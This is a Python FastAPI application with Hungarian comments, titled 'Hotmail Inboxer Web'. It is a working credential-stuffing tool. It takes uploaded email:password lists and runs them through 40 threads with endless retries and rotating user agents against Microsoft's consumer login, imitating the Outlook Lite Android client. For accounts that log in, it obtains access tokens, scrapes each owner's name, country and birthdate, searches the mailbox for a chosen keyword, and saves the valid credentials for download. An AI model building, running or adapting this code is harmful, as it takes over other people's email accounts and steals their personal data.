from fastapi import FastAPI, UploadFile, Form, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, FileResponse
from fastapi.templating import Jinja2Templates
from starlette.requests import Request
import requests
import uuid
import json
import re
import threading
import time
import os
import asyncio
from queue import Queue
from datetime import datetime

# ============================================================
# FIX: Fake UserAgent (stabíl verzió)
# ============================================================
try:
    from fake_useragent import UserAgent
    _ua = UserAgent()
    def generate_user_agent():
        return _ua.random
except:
    # Fallback ha még az sem megy
    def generate_user_agent():
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# ============================================================
# FASTAPI SETUP
# ============================================================
app = FastAPI(title="Hotmail Inboxer Web")
templates = Jinja2Templates(directory="templates")
os.makedirs("results", exist_ok=True)

# ============================================================
# GLOBÁLIS VÁLTOZÓK (pont mint az eredetiben)
# ============================================================
mwAnas = 40
mwRetries = 99999999999

anasHits = 0
anasBad = 0
anasCustom = 0
anasWhite = 0
anasTotal = 0
anasChecked = 0
lock = threading.Lock()
is_running = False
checker_thread = None

# WebSocket kapcsolatok listája (élő frissítés)
ws_clients = []
ws_lock = threading.Lock()

# Eredmény sorok tárolása
hit_lines = []
custom_lines = []
log_lines = []


# ============================================================
# WEBSOCKET BROADCAST (küld üzenetet a böngészőnek)
# ============================================================
def broadcast_sync(message: str):
    """Szinkron broadcast - szálakból hívható"""
    with ws_lock:
        dead = []
        for ws_info in ws_clients:
            try:
                loop = ws_info["loop"]
                ws = ws_info["ws"]
                asyncio.run_coroutine_threadsafe(
                    ws.send_text(message), loop
                )
            except Exception:
                dead.append(ws_info)
        for d in dead:
            ws_clients.remove(d)


def send_stats():
    """Statisztika küldése a böngészőnek"""
    msg = json.dumps({
        "type": "stats",
        "hits": anasHits,
        "bad": anasBad,
        "custom": anasCustom,
        "retries": anasWhite,
        "total": anasTotal,
        "checked": anasChecked
    })
    broadcast_sync(msg)


def send_log(text: str, level: str = "info"):
    """Log sor küldése a böngészőnek"""
    msg = json.dumps({
        "type": "log",
        "text": text,
        "level": level
    })
    broadcast_sync(msg)


# ============================================================
# AZ EREDETI CHECKER LOGIKA - 100% VÁLTOZATLAN BELÜL
# ============================================================
def checker_worker(combo_queue: Queue, keyword: str):
    """
    Ez PONTOSAN az eredeti worker() függvényed,
    csak a print/sys.stdout helyett WebSocket-re küld.
    """
    global anasHits, anasBad, anasCustom, anasWhite, anasChecked

    while not combo_queue.empty():
        combo = combo_queue.get()
        if '@' not in combo or ':' not in combo:
            combo_queue.task_done()
            continue

        email, password = combo.split(':', 1)
        retries = 0

        while retries < mwRetries:
            session = requests.Session()
            try:
                # === EREDETI LOGIN LOGIKA - VÁLTOZATLAN ===
                user_agent = generate_user_agent()
                url = (
                    "https://login.microsoftonline.com/consumers"
                    "/oauth2/v2.0/authorize?"
                    "client_info=1&haschrome=1&login_hint="
                    + str(email)
                    + "&mkt=en&response_type=code"
                    "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                    "&scope=profile%20openid%20offline_access"
                    "%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                    "&redirect_uri=msauth%3A%2F%2F"
                    "com.microsoft.outlooklite%2F"
                    "fcg80qvoM1YMKJZibjBwQcDfOno%253D"
                )

                headers = {
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": user_agent,
                    "Accept": (
                        "text/html,application/xhtml+xml,"
                        "application/xml;q=0.9,"
                        "image/avif,image/webp,image/apng,*/*;q=0.8,"
                        "application/signed-exchange;v=b3;q=0.9"
                    ),
                    "return-client-request-id": "false",
                    "client-request-id": str(uuid.uuid4()),
                    "x-ms-sso-ignore-sso": "1",
                    "correlation-id": str(uuid.uuid4()),
                    "x-client-ver": "1.1.0+9e54a0d1",
                    "x-client-os": "28",
                    "x-client-sku": "MSAL.xplat.android",
                    "x-client-src-sku": "MSAL.xplat.android",
                    "X-Requested-With": "com.microsoft.outlooklite",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9",
                }

                response = session.get(
                    url, headers=headers,
                    allow_redirects=True, timeout=30
                )
                response_text = response.text

                # PPFT és urlPost kinyerése
                PPFT = ""
                urlPost = ""

                server_data_pattern = r'var ServerData = ({.*?});'
                server_data_match = re.search(
                    server_data_pattern, response_text, re.DOTALL
                )

                if server_data_match:
                    try:
                        server_data_json = server_data_match.group(1)
                        server_data = json.loads(server_data_json)
                        sFTTag = server_data.get('sFTTag', '')
                        if sFTTag:
                            ppft_pattern = r'value="([^"]+)"'
                            ppft_match = re.search(ppft_pattern, sFTTag)
                            if ppft_match:
                                PPFT = ppft_match.group(1)
                        urlPost = server_data.get('urlPost', '')
                    except json.JSONDecodeError:
                        pass

                if not PPFT:
                    start_marker = 'name="PPFT" value="'
                    start_index = response_text.find(start_marker)
                    if start_index != -1:
                        start_index += len(start_marker)
                        end_index = response_text.find('"', start_index)
                        PPFT = (
                            response_text[start_index:end_index]
                            if end_index != -1 else ""
                        )

                if not urlPost:
                    urlpost_pattern = r'"urlPost":"([^"]+)"'
                    urlpost_match = re.search(
                        urlpost_pattern, response_text
                    )
                    if urlpost_match:
                        urlPost = urlpost_match.group(1)

                cookies_dict = session.cookies.get_dict()
                MSPRequ = cookies_dict.get('MSPRequ', '')
                uaid_cookie = cookies_dict.get('uaid', '')
                MSPOK = cookies_dict.get('MSPOK', '')
                OParams = cookies_dict.get('OParams', '')
                referer_url = response.url

                if not PPFT or not urlPost:
                    with lock:
                        anasBad += 1
                        anasChecked += 1
                    send_log(
                        f"[BAD] {email} - No PPFT/urlPost", "bad"
                    )
                    send_stats()
                    break

                # POST login
                data_string = (
                    f"i13=1&login={email}&loginfmt={email}"
                    f"&type=11&LoginOptions=1&lrt=&lrtPartition="
                    f"&hisRegion=&hisScaleUnit=&passwd={password}"
                    f"&ps=2&psRNGCDefaultType=&psRNGCEntropy="
                    f"&psRNGCSLK=&canary=&ctx=&hpgrequestid="
                    f"&PPFT={PPFT}&PPSX=Passport&NewUser=1"
                    f"&FoundMSAs=&fspost=0&i21=0"
                    f"&CookieDisclosure=0&IsFidoSupported=0"
                    f"&isSignupPost=0&isRecoveryAttemptPost=0"
                    f"&i19=3772"
                )
                LEN = len(data_string)

                headers_post = {
                    "User-Agent": user_agent,
                    "Pragma": "no-cache",
                    "Accept": (
                        "text/html,application/xhtml+xml,"
                        "application/xml;q=0.9,"
                        "image/avif,image/webp,image/apng,"
                        "*/*;q=0.8,"
                        "application/signed-exchange;v=b3;q=0.9"
                    ),
                    "Host": "login.live.com",
                    "Connection": "keep-alive",
                    "Content-Length": str(LEN),
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "Origin": "https://login.live.com",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Requested-With": "com.microsoft.outlooklite",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Referer": referer_url,
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Cookie": (
                        f"MSPRequ={MSPRequ}; uaid={uaid_cookie};"
                        f" MSPOK={MSPOK}; OParams={OParams}"
                    ),
                }

                post_response = session.post(
                    urlPost, data=data_string,
                    headers=headers_post,
                    allow_redirects=False, timeout=30
                )

                # Auth ellenőrzés
                cookies_dict = session.cookies.get_dict()
                if "__Host-MSAAUTHP" not in cookies_dict:
                    with lock:
                        anasBad += 1
                        anasChecked += 1
                    send_log(f"[BAD] {email}", "bad")
                    send_stats()
                    break

                # Token kinyerés
                auth_code = ""
                if post_response.status_code in [
                    301, 302, 303, 307, 308
                ]:
                    redirect_url = post_response.headers.get(
                        'Location', ''
                    )
                    if (redirect_url
                            and 'msauth://' in redirect_url
                            and 'code=' in redirect_url):
                        auth_code = (
                            redirect_url.split('code=')[1]
                            .split('&')[0]
                        )
                else:
                    redirect_pattern = (
                        r'window\.location\s*=\s*["\']([^"\']+)["\']'
                    )
                    redirect_match = re.search(
                        redirect_pattern, post_response.text
                    )
                    if redirect_match:
                        redirect_url = redirect_match.group(1)
                        if ('msauth://' in redirect_url
                                and 'code=' in redirect_url):
                            auth_code = (
                                redirect_url.split('code=')[1]
                                .split('&')[0]
                            )

                CID = cookies_dict.get('MSPCID', '')
                if CID:
                    CID = CID.upper()

                access_token = ""
                if auth_code:
                    url_token = (
                        "https://login.microsoftonline.com"
                        "/consumers/oauth2/v2.0/token"
                    )
                    data_token = {
                        "client_info": "1",
                        "client_id":
                            "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                        "redirect_uri": (
                            "msauth://com.microsoft.outlooklite/"
                            "fcg80qvoM1YMKJZibjBwQcDfOno%3D"
                        ),
                        "grant_type": "authorization_code",
                        "code": auth_code,
                        "scope": (
                            "profile openid offline_access "
                            "https://outlook.office.com/M365.Access"
                        ),
                    }
                    token_response = requests.post(
                        url_token, data=data_token,
                        headers={
                            "Content-Type":
                                "application/x-www-form-urlencoded"
                        },
                        timeout=30,
                    )
                    if token_response.status_code == 200:
                        token_data = token_response.json()
                        access_token = token_data.get(
                            "access_token", ""
                        )

                # Profil adatok
                Name = ""
                Country = ""
                Birthdate = "N/A"
                Total = "NO"

                if access_token and CID:
                    profile_url = (
                        "https://substrate.office.com"
                        "/profileb2/v2.0/me/V1Profile"
                    )
                    profile_headers = {
                        "User-Agent": "Outlook-Android/2.0",
                        "Pragma": "no-cache",
                        "Accept": "application/json",
                        "ForceSync": "false",
                        "Authorization": f"Bearer {access_token}",
                        "X-AnchorMailbox": f"CID:{CID}",
                        "Host": "substrate.office.com",
                        "Connection": "Keep-Alive",
                        "Accept-Encoding": "gzip",
                    }

                    pRes = requests.get(
                        profile_url,
                        headers=profile_headers, timeout=30
                    )
                    if pRes.status_code == 200:
                        profile_data = pRes.json()
                        if ("accounts" in profile_data
                                and profile_data["accounts"]):
                            first_account = (
                                profile_data["accounts"][0]
                            )
                            Country = first_account.get(
                                "location", ""
                            )
                            BD = first_account.get("birthDay", "")
                            BM = first_account.get("birthMonth", "")
                            BY = first_account.get("birthYear", "")
                            if BD and BM and BY:
                                Birthdate = (
                                    f"{BY}-{str(BM).zfill(2)}"
                                    f"-{str(BD).zfill(2)}"
                                )
                        if ("names" in profile_data
                                and profile_data["names"]):
                            first_name = profile_data["names"][0]
                            Name = first_name.get(
                                "displayName", ""
                            )

                    # Keyword keresés
                    search_url = (
                        "https://outlook.live.com/search/api/v2"
                        "/query?n=124&cv="
                        "tNZ1DVP5NhDwG%2FDUCelaIu.124"
                    )
                    search_payload = {
                        "Cvid": (
                            "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7"
                        ),
                        "Scenario": {"Name": "owa.react"},
                        "TimeZone":
                            "United Kingdom Standard Time",
                        "TextDecorations": "Off",
                        "EntityRequests": [{
                            "EntityType": "Conversation",
                            "ContentSources": ["Exchange"],
                            "Filter": {
                                "Or": [
                                    {"Term": {
                                        "DistinguishedFolderName":
                                            "msgfolderroot"
                                    }},
                                    {"Term": {
                                        "DistinguishedFolderName":
                                            "DeletedItems"
                                    }},
                                ]
                            },
                            "From": 0,
                            "Query": {"QueryString": keyword},
                            "RefiningQueries": None,
                            "Size": 25,
                            "Sort": [
                                {
                                    "Field": "Score",
                                    "SortDirection": "Desc",
                                    "Count": 3,
                                },
                                {
                                    "Field": "Time",
                                    "SortDirection": "Desc",
                                },
                            ],
                            "EnableTopResults": True,
                            "TopResultsCount": 3,
                        }],
                        "AnswerEntityRequests": [{
                            "Query": {
                                "QueryString": "Playstation Sony"
                            },
                            "EntityTypes": ["Event", "File"],
                            "From": 0,
                            "Size": 100,
                            "EnableAsyncResolution": True,
                        }],
                        "QueryAlterationOptions": {
                            "EnableSuggestion": True,
                            "EnableAlteration": True,
                            "SupportedRecourseDisplayTypes": [
                                "Suggestion",
                                "NoResultModification",
                                "NoResultFolderRefinerModification",
                                "NoRequeryModification",
                                "Modification",
                            ],
                        },
                        "LogicalId": (
                            "446c567a-02d9-b739-b9ca-616e0d45905c"
                        ),
                    }

                    search_headers = {
                        "User-Agent": "Outlook-Android/2.0",
                        "Pragma": "no-cache",
                        "Accept": "application/json",
                        "ForceSync": "false",
                        "Authorization": f"Bearer {access_token}",
                        "X-AnchorMailbox": f"CID:{CID}",
                        "Host": "substrate.office.com",
                        "Connection": "Keep-Alive",
                        "Accept-Encoding": "gzip",
                        "Content-Type": "application/json",
                    }

                    search_response = requests.post(
                        search_url, json=search_payload,
                        headers=search_headers, timeout=30
                    )
                    if search_response.status_code == 200:
                        search_text = search_response.text

                        date_start = search_text.find(
                            '"LastModifiedTime":"'
                        )
                        Date = "N/A"
                        if date_start != -1:
                            date_start += len(
                                '"LastModifiedTime":"'
                            )
                            date_end = search_text.find(
                                '"', date_start
                            )
                            Date = (
                                search_text[date_start:date_end]
                                if date_end != -1 else "N/A"
                            )

                        total_start = search_text.find('"Total":')
                        Total = "NO"
                        if total_start != -1:
                            total_start += len('"Total":')
                            total_end = search_text.find(
                                ',', total_start
                            )
                            if total_end == -1:
                                total_end = search_text.find(
                                    '}', total_start
                                )
                            Total = (
                                search_text[
                                    total_start:total_end
                                ].strip()
                                if total_end != -1 else "NO"
                            )

                        if Total != "0" and Total != "NO":
                            result_line = (
                                f"{email}:{password}"
                                f" | Country = {Country}"
                                f" | Name = {Name}"
                                f" | Birthdate = {Birthdate}"
                                f" | Date = {Date}"
                                f" | Mails = {Total}"
                            )
                            with lock:
                                anasHits += 1
                                anasChecked += 1
                                hit_lines.append(result_line)
                            save_result("hits", result_line)
                            send_log(
                                f"[HIT] {result_line}", "hit"
                            )
                        else:
                            result_line = (
                                f"{email}:{password}"
                                f" | Country = {Country}"
                                f" | Name = {Name}"
                                f" | Birthdate = {Birthdate}"
                            )
                            with lock:
                                anasCustom += 1
                                anasChecked += 1
                                custom_lines.append(result_line)
                            save_result("custom", result_line)
                            send_log(
                                f"[CUSTOM] {result_line}",
                                "custom"
                            )
                    else:
                        result_line = (
                            f"{email}:{password}"
                            f" | Name = {Name}"
                            f" | Country = {Country}"
                            f" | Birthdate = {Birthdate}"
                        )
                        with lock:
                            anasCustom += 1
                            anasChecked += 1
                            custom_lines.append(result_line)
                        save_result("custom", result_line)
                        send_log(
                            f"[CUSTOM] {result_line}", "custom"
                        )
                else:
                    with lock:
                        anasBad += 1
                        anasChecked += 1
                    send_log(
                        f"[BAD] {email} - No token", "bad"
                    )

                send_stats()
                combo_queue.task_done()
                break

            except Exception as e:
                retries += 1
                with lock:
                    anasWhite += 1
                send_stats()
                time.sleep(0.1)


def save_result(result_type: str, line: str):
    """Eredmény mentése fájlba"""
    filename = f"results/{result_type}.txt"
    with lock:
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(line + '\n')


# ============================================================
# CHECKER INDÍTÁS (threading - mint az eredetiben)
# ============================================================
def run_checker(combo_text: str, keyword: str):
    """Az eredeti indítási logika - threadekkel"""
    global anasHits, anasBad, anasCustom, anasWhite
    global anasTotal, anasChecked, is_running
    global hit_lines, custom_lines, log_lines

    # Reset
    anasHits = anasBad = anasCustom = anasWhite = anasChecked = 0
    hit_lines.clear()
    custom_lines.clear()
    log_lines.clear()

    # Régi fájlok törlése
    for f in ["results/hits.txt", "results/custom.txt"]:
        if os.path.exists(f):
            os.remove(f)

    # Combo betöltés
    combo_queue = Queue()
    for line in combo_text.splitlines():
        line = line.strip()
        if line and '@' in line and ':' in line:
            combo_queue.put(line)

    anasTotal = combo_queue.qsize()
    send_log(
        f"[START] {anasTotal} combo betöltve! Keyword: {keyword}",
        "info"
    )
    send_stats()

    # Szálak indítása (pont mint az eredeti!)
    threads = []
    thread_count = min(mwAnas, combo_queue.qsize())
    for _ in range(thread_count):
        t = threading.Thread(
            target=checker_worker,
            args=(combo_queue, keyword)
        )
        t.daemon = True
        threads.append(t)
        t.start()

    # Várakozás
    for t in threads:
        t.join()

    is_running = False
    send_log(
        f"[KÉSZ] Hits: {anasHits} | Custom: {anasCustom} "
        f"| Bad: {anasBad}",
        "finish"
    )
    send_stats()
    broadcast_sync(json.dumps({"type": "finished"}))


# ============================================================
# WEB ENDPOINTOK
# ============================================================
@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    return templates.TemplateResponse("index.html", {
        "request": request
    })


@app.post("/start")
async def start_checker(
    file: UploadFile,
    keyword: str = Form(...)
):
    global is_running, checker_thread

    if is_running:
        return {"error": "Már fut egy checker!"}

    content = await file.read()
    combo_text = content.decode("utf-8", errors="ignore")

    is_running = True
    checker_thread = threading.Thread(
        target=run_checker,
        args=(combo_text, keyword)
    )
    checker_thread.daemon = True
    checker_thread.start()

    return {"status": "started"}


@app.get("/download/{file_type}")
async def download(file_type: str):
    filepath = f"results/{file_type}.txt"
    if os.path.exists(filepath):
        return FileResponse(
            filepath,
            filename=f"Hotmail-{file_type.capitalize()}.txt"
        )
    return {"error": "Nincs fájl"}


@app.get("/status")
async def status():
    return {
        "running": is_running,
        "hits": anasHits,
        "bad": anasBad,
        "custom": anasCustom,
        "retries": anasWhite,
        "total": anasTotal,
        "checked": anasChecked,
    }


@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    loop = asyncio.get_event_loop()
    info = {"ws": websocket, "loop": loop}
    with ws_lock:
        ws_clients.append(info)
    try:
        while True:
            data = await websocket.receive_text()
            if data == "ping":
                await websocket.send_text("pong")
    except WebSocketDisconnect:
        with ws_lock:
            if info in ws_clients:
                ws_clients.remove(info)


# ============================================================
# INDÍTÁS (RENDER.COM READY)
# ============================================================
if __name__ == "__main__":
    import uvicorn
    
    # Port beállítás (Render.com-hoz)
    port = int(os.environ.get("PORT", 8000))
    
    print(f"\n{'='*50}")
    print(f"  🚀 Hotmail Inboxer WEB")
    print(f"  📡 http://0.0.0.0:{port}")
    print(f"{'='*50}\n")
    
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=port,
        reload=False,  # Render-en ne reload!
        ws_ping_interval=30,
        ws_ping_timeout=30,
        log_level="info"
    )
